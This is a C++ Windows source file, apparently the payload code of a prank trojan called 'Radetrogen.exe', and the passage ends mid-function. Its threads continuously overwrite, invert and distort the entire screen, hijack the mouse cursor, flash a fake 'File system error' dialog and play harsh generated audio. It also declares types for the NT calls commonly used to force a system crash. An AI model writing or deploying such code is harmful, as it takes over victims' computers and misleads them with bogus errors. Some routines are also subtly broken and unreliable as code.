#include <Windows.h>
typedef struct IUnknown IUnknown;
#include <cmath>
#pragma comment(lib, "winmm.lib")
#pragma once
#define M_PI 3.14159265358979323846264338327950288
#include <tchar.h>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include <ctime>
static ULONGLONG r, n;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
#include <stdlib.h>
#include <mmsystem.h>
#include "MMSystem.h"
#define _USE_MATH_DEFINES 1
using namespace std;
#define getrandom time(NULL)
#define M_PI 3.14159265358979323846
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma once
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
//Shake & Warp Pre-Config
int shakeIntensity = 1;
int warpIntensity = 3;

//Wave Pre-Config
int waveDelay = rand() % 30;

//Random Thing Pre-Config
bool random = true;

//Random colors Pre-Config
int colorsdelay = 50;
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
RGBQUAD* rgbquad = NULL;
HDC dc = GetDC(NULL);

typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT v;
} HSV;

typedef struct
{
	int vtx0;
	int vtx1;
} EDGE;

typedef struct
{
	float x;
	float y;
	float z;
} VERTEX;
namespace _3D
{
	VOID RotateX(VERTEX* vtx, float angle)
	{
		vtx->y = cos(angle) * vtx->y - sin(angle) * vtx->z;
		vtx->z = sin(angle) * vtx->y + cos(angle) * vtx->z;
	}

	VOID RotateY(VERTEX* vtx, float angle)
	{
		vtx->x = cos(angle) * vtx->x + sin(angle) * vtx->z;
		vtx->z = -sin(angle) * vtx->x + cos(angle) * vtx->z;
	}

	VOID RotateZ(VERTEX* vtx, float angle)
	{
		vtx->x = cos(angle) * vtx->x - sin(angle) * vtx->y;
		vtx->y = sin(angle) * vtx->x + cos(angle) * vtx->y;
	}

	void DrawEdge(HDC dc, LPCWSTR icon, int x0, int y0, int x1, int y1, int r)
	{
		int dx = abs(x1 - x0);
		int dy = -abs(y1 - y0);

		int sx = (x0 < x1) ? 1 : -1;
		int sy = (y0 < y1) ? 1 : -1;

		int error = dx + dy;

		int i = 0;

		while (true)
		{
			if (i == 0)
			{
				DrawIcon(dc, x0, y0, LoadIcon(NULL, icon));
				i = 10;
			}
			else
			{
				i--;
			}

			if (x0 == x1 && y0 == y1)
			{
				break;
			}

			int e2 = 2 * error;

			if (e2 >= dy)
			{
				if (x0 == x1)
				{
					break;
				}

				error += dy;
				x0 += sx;
			}

			if (e2 <= dx)
			{
				if (y0 == y1)
				{
					break;
				}

				error += dx;
				y0 += sy;
			}
		}
	}
}

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}

namespace Colors
{
	RGBQUAD HSVtoRGB(HSV hsv)
	{
		int hi = (int)floor(hsv.h / 60.0) % 6;
		double f = hsv.h / 60.0 - floor(hsv.h / 60.0);
		double p = hsv.v * (1.0 - hsv.s);
		double q = hsv.v * (1.0 - f * hsv.s);
		double t = hsv.v * (1.0 - (1.0 - f) * hsv.s);

		switch (hi)
		{
		case 0:
			return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255) };
		case 1:
			return { static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255) };
		case 2:
			return { static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255) };
		case 3:
			return { static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255) };
		case 4:
			return { static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255) };
		default:
			return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255) };
		}
	}

	HSV RGBtoHSV(RGBQUAD rgbquad)
	{
		HSV hsv;

		double rd = rgbquad.rgbRed / 255.0;
		double gd = rgbquad.rgbGreen / 255.0;
		double bd = rgbquad.rgbBlue / 255.0;

		double cmax = max(max(rd, gd), bd);
		double cmin = min(min(rd, gd), bd);
		double delta = cmax - cmin;

		hsv.v = cmax;

		if (cmax > 0.0)
			hsv.s = delta / cmax;
		else
			hsv.s = 0.0;

		if (delta > 0.0)
		{
			if (cmax == rd)
				hsv.h = 60.0 * fmod((gd - bd) / delta, 6.0);
			else if (cmax == gd)
				hsv.h = 60.0 * ((bd - rd) / delta + 2.0);
			else if (cmax == bd)
				hsv.h = 60.0 * ((rd - gd) / delta + 4.0);

			if (hsv.h < 0.0)
				hsv.h += 360.0;
		}
		else
		{
			hsv.h = 0.0;
		}

		return hsv;
	}
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

DWORD WINAPI curRand(LPVOID lpParam) {
	POINT cursor;
	while (1) {
		GetCursorPos(&cursor);
		int X = cursor.x + rand() % 3 - 1;
		int Y = cursor.y + rand() % 3 - 1;
		SetCursorPos(X, Y);
		//BlockInput(true);
		//Sleep(10);
	}
	return(1);
}


DWORD WINAPI sub_4(LPVOID lpvd)
{
	HDC getsa = GetDC(0);
	POINT pt;
	int x = GetSystemMetrics(SM_CXICON) / 2;
	int y = GetSystemMetrics(SM_CYICON) / 2;
	while (true)
	{
		GetCursorPos(&pt);
		DrawIcon(getsa, pt.x - x, pt.y - y, LoadIcon(NULL, IDI_ERROR));
		DrawIcon(getsa, pt.x - 50, pt.y - 50, LoadIcon(NULL, IDI_ASTERISK));
		DrawIcon(getsa, pt.x - 100, pt.y - 100, LoadIcon(NULL, IDI_APPLICATION));
		DrawIcon(getsa, pt.x - 150, pt.y - 150, LoadIcon(NULL, IDI_WARNING));
		DrawIcon(getsa, pt.x - 200, pt.y - 200, LoadIcon(NULL, IDI_QUESTION));
	}
}

DWORD WINAPI fakeerror(LPVOID lpParam) {
	MessageBox(NULL, L"File system error (-2147219196).", L" ", MB_ICONERROR);
	return 0;
}

LPCWSTR  generateRandomUnicodeString(int len)
{
	wchar_t* ustr = new wchar_t[len + 1];      // +1 for '\0'

	for (int i = 0; i < len; i++) {
		ustr[i] = (rand() % 256) + 1024;
	}
	ustr[len] = L'\0';
	return ustr;
}



DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			//INT x = i % w, y = i / w;
			rgbScreen[i].rgb -= 666;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(100);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
VOID WINAPI ci(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}
DWORD WINAPI wef(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

	for (int t = 0;; t++)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

		for (int i = 0; i < size; i += 100)
		{
			ci(x - i / 2, y - i / 2, i, i);
			Sleep(25);
		}
	}
}
DWORD WINAPI shake(LPVOID lpParam)
{
	while (1) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 2, rand() % 2, x, y, hdc, rand() % 2, rand() % 2, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI patblt(LPVOID lpParam)
{
	while (1)
	{
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 225, rand() % 225, rand() % 225));
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, x, y, PATINVERT);
		ReleaseDC(0, hdc);
		DeleteObject(brush);
		Sleep(10);
	}
}
DWORD WINAPI train(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, -30, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, w - 30, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
DWORD WINAPI shader2(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += (x * y);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = (x & y) * RGB(GetRValue(Hue(239)), GetGValue(Hue(239)), GetBValue(Hue(239)))/**/;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			rgbScreen[i].r += 666;
			rgbScreen[i].g += 666;
			rgbScreen[i].b += 666;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(1000);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI drawEllipse(LPVOID lpParam)
{
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);


	while (1)
	{
		HDC hdc = GetDC(0);
		int rand_num_x = rand() % w;
		int rand_num_y = rand() % h;

		int top_x = 0 + rand_num_x; // Top Left Corner
		int top_y = 0 + rand_num_y; // Top Right Corner

		int bottom_x = 100 + rand_num_x; // Bottom Left Corner
		int bottom_y = 100 + rand_num_y; // Bottom Right Corner

		Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
		Sleep(100);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI textout(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	LPCWSTR lpText = L"Radetrogen.exe";
	while (1) {
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		SetTextColor(hdc, Hue(239));
		SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(hdc, top_x, top_y, lpText, wcslen(lpText));
		if (y == GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x == GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI hslfill(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(NULL);
		int x = GetSystemMetrics(SM_CXSCREEN),
			y = GetSystemMetrics(SM_CYSCREEN);

		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, PATCOPY);
		DeleteObject(brush);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}
DWORD WINAPI masher(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
		BitBlt(hdc, rand() % 5, rand() % 5, rand() % sw, rand() % sh, hdc, rand() % 5, rand() % 5, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI squares(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		Rectangle(hdc, top_x, top_y, bottom_x, bottom_y);
		if (y == GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x == GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader5(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += (x ^ y);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		//Sleep(100);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI textout3(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text = "Radetrogen.exe";
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		Sleep(100);
		DeleteObject(font);
		ReleaseDC(0, hdc);
	}
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t + (t ^ (t >> 7)) ^ 5) * 5 | ((t * 2 >> 43 | t * 3 * 5 >> 4) * 19) & (t * 7 >> 172) / 2 * (t * ((t >> 9 | t >> 13) & 15)) & 129 | t * ((t >> 9 | t > 3) & 25 & t >> 10);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * t / 10000) % 100 | ((t % 29 + t % 46 + t % ((t >> 14) % 2 ? 34 : 43)) + (t % 17)) << 1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t - 2048, ((t & t >> 6) & (t * (t >> ((t & 65535) >> 12)))) + ((t * 3 / 4 & t >> 12) & 127) + (t * (t >> 7 & t >> 8 & t >> 9 & 16) >> t / 64));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((3 + (1 ^ t >> 10 & 3)) * (4 + (2 & t >> 5)))) >> (t >> 5 & 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (0xCA68 >> (t >> 9 & 14) & 15) | t >> 6);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI tunnel(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HWND hwnd = GetDesktopWindow();
	RECT rect;
	while (true)
	{
		GetWindowRect(hwnd, &rect);
		int r = rand() % 2;
		if (r == 0)
		{
			StretchBlt(hdc, 5, 5, rect.right - 10, rect.bottom - 10, hdc, 0, 0, rect.right, rect.bottom, SRCCOPY);
		}
	}
}


DWORD WINAPI circles(LPVOID lpvd)
{
	while (true)
	{
		HDC ccc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int x = rand() % w;
		int y = rand() % h;
		HRGN rgn = CreateEllipticRgn(x, y, w / 7, w / 7 + y);
		InvertRgn(ccc, rgn);
		ReleaseDC(0, ccc);
		DeleteDC(ccc);
		DeleteObject(rgn);
		Sleep(100);
	}
}

VOID WINAPI otv()
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	RECT wRect;
	POINT wPt[3];
	GetWindowRect(GetDesktopWindow(), &wRect);
	HDC dickMen = CreateCompatibleDC(desk);
	HBITMAP scr = CreateCompatibleBitmap(desk, sw, sh);
	SelectObject(dickMen, scr);
	int x2 = rand() & sw;
	wPt[0].x = wRect.left - rand() % sw + sh;
	wPt[0].y = wRect.left - rand() % sw + sh;
	wPt[1].x = wRect.left - rand() % sw + sh;
	wPt[1].y = wRect.left + rand() % sw + sh;
	wPt[2].y = wRect.left + x2 - rand() % sw + sh;
	wPt[2].y = wRect.left + x2 - rand() % sw + sh;
	PlgBlt(dickMen, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	BitBlt(desk, 0, 0, sw, sh, dickMen, 0, 0, !(rand() % 2) ? (rand() % 2) ? SRCAND : SRCPAINT : !(rand() % 2) ? !(rand() % 2) ? SRCINVERT : SRCPAINT : !(rand() % 2) ? SRCAND : !(rand() % 2) ? SRCERASE : NOTSRCERASE);
	Sleep(1000);
}

DWORD WINAPI effects11(LPVOID lpParam)
{
	HWND upWnd = GetForegroundWindow();
	HDC upHdc = GetDC(upWnd);
	HDC desktop = GetDC(NULL);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);

	while (true)
	{
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		desktop = GetDC(NULL);

		for (int i = 0; i < 1900; i++)
		{
			BitBlt(desktop, i, i, i, i, desktop, i, i, NOTSRCCOPY);
		}


		for (int j = 0; j < 1900; j++)
		{
			BitBlt(desktop, j, j, j, j, desktop, 100, 100, NOTSRCCOPY);
		}

		//{

		//}
		//for (int i = 0; i < 1900; i++)
	}
}
DWORD WINAPI effect(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75)));
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
		Sleep(10);
	}
}
DWORD WINAPI wow2(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		desk = GetDC(0);
		//int x1 = rand() % 310;
		GetWindowRect(GetDesktopWindow(), &wRect);
		HDC deskMen = CreateCompatibleDC(desk);
		HBITMAP scr = CreateCompatibleBitmap(desk, sw, sh);
		SelectObject(deskMen, scr);
		wPt[0].x = wRect.left + 100;
		wPt[0].y = wRect.bottom - 10;
		wPt[1].x = wRect.left + 10;
		wPt[1].y = wRect.bottom + 100;
		wPt[2].x = wRect.left - sw;
		wPt[2].y = wRect.bottom - sh;
